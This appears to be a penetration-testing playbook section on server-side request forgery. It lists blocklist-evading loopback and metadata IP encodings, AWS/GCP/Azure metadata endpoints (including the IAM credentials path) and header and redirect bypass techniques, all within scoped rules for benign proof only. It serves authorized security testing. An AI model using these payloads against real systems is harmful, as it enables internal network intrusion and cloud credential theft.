# SSRF and metadata (CWE-918)

Alias tables, metadata URL families (documented example paths only),
redirect method, and safe impact-proof rules.

## 1. Sink identification checklist

- URL parameters: `url=`, `fetch=`, `import=`, `src=`, `callback=`,
  `webhook=`, `avatar=`, `image_url=`, `remote=`, `feed=`, `endpoint=`.
- Features: import-from-URL, feed readers, webhooks configurators, "attach by
  link", avatar/profile picture by URL, PDF generators, HTML-to-image/thumbnail
  services, SAML metadata fetchers, OAuth `redirect_uri` backend validation.
- Proxy-like endpoints: PDF export, screenshot, "preview link", archive/zip
  from URL.
- Discovery evidence: parameter names from P1 inventory + JS bundle greps for
  `fetch(`, `axios.get(`, `requests.get`, server-side `HttpWebRequest`.

## 2. Localhost / internal alias table

| Form | Example | Defeats |
|---|---|---|
| short loopback | `http://127.1/` | blocklists matching `127.0.0.1` string |
| padded decimal | `http://127.000.000.001/` | regex `^127\.0\.0\.1$` |
| wildcard bind | `http://0.0.0.0/` | blocklists that forget 0.0.0.0 |
| IPv6 loopback | `http://[::]/`, `http://[::1]/` | IPv4-only checks |
| hex | `http://0x7f000001/` | decimal-only parsing |
| octal | `http://0177.0.0.1/` | decimal-only parsing |
| decimal dword | `http://2130706433/` | string blocklists entirely |
| hex dword (metadata) | `http://0xA9FEA9FE/` (= 169.254.169.254) | `169.254` string checks |
| decimal dword (metadata) | `http://2852039166/` | same |
| case/trailing dot | `http://LOCALHOST:8080/`, `http://127.0.0.1./` | case-sensitive lists |

Internal ranges beyond loopback: only hosts/CIDRs inside the engagement scope
file; incidental internal services are recorded as observations, never probed.

## 3. Metadata URL families (documented example paths only)

Proof = reachability plus at most one benign field (e.g. `hostname`). NEVER
retrieve credentials, instance-identity documents, or user data.

| Cloud | Base | Documented example paths | Auth quirk |
|---|---|---|---|
| AWS IMDSv1 | `http://169.254.169.254/latest/` | `meta-data/hostname`, `meta-data/iam/security-credentials/` (path exists — do NOT fetch contents) | v1 = plain GET; a `405`/token error indicates IMDSv2 |
| AWS IMDSv2 | same | `api/token` (PUT, `X-aws-ec2-metadata-token-ttl-seconds`) | token required; hop-limit often blocks proxying |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | `instance/hostname` | requires header `Metadata-Flavor: Google` |
| Azure | `http://169.254.169.254/metadata/instance` | `?api-version=2021-02-01` | requires header `Metadata: true` |

Header-based bypass attempts (record attempts even when they fail — failed
attempts are coverage evidence):

- `Host: 169.254.169.254` override when the app proxies by Host.
- Absolute-form request line: `GET http://169.254.169.254/latest/meta-data/
  HTTP/1.1` through a misconfigured forward proxy.
- `X-Forwarded-For` / `X-Real-IP` spoofing to pass an SSRF "protection"
  middleware that allowlists proxy hops.
- Redirect: the app fetches an engagement-controlled URL (on the `20`
  listener) that returns `302 Location: http://169.254.169.254/...` —
  defeats allowlists applied only to the initial URL.

## 4. Procedure

1. External canary first: point the sink at a `20`-listener URL labeled with
   the canary (`http://canary.rj-pt.example/p5/ssrf/<surface>`); a DNS/HTTP
   hit = blind SSRF D1 without touching internal space.
2. Alias ladder (section 2) against loopback ports of in-scope services; map
   which internal HTTP services answer (status/headers) — record, do not
   attack; hand the map to the report and to `70-exploit-intel` if versions
   are fingerprintable.
3. Metadata probes (section 3) — benign field only.
4. Redirect chain (section 3) when direct forms are filtered.
5. Scheme probing: `file://`, `gopher://`, `dict://` reachability is recorded
   as transport findings; do not read local files via SSRF unless explicitly
   in scope (that is an impact proof for `45` with operator authorization).

## 5. Safe impact-proof rules

- Reachability + one benign field (hostname) is a complete, proportionate
  impact proof. A credential path existing (200 on the directory listing) is
  stated as exposure, not exploited.
- No mass port scanning through the SSRF; a short, hand-picked port list per
  known internal host only (22, 80, 443, 3000, 6379, 8006, 8080, 9200 style),
  serial, <= 2 retries.
- Blind interactions land on the `20` OOB listener with canary labels;
  a DNS hit is D1, replay makes it D2.
- Every probe pair saved as `evidence/p5-ssrf-<surface>-<seq>.{req,resp}.txt`;
  for blind hits, archive the listener log excerpt alongside.

## 6. Handoffs

- Internal service versions discovered via SSRF -> `10` fingerprints ->
  `70-exploit-intel`.
- Internal admin panels reachable only through SSRF -> observation in the
  report; attacking them needs scope amendment.
- Blind machinery -> `20-traffic-manipulation`.
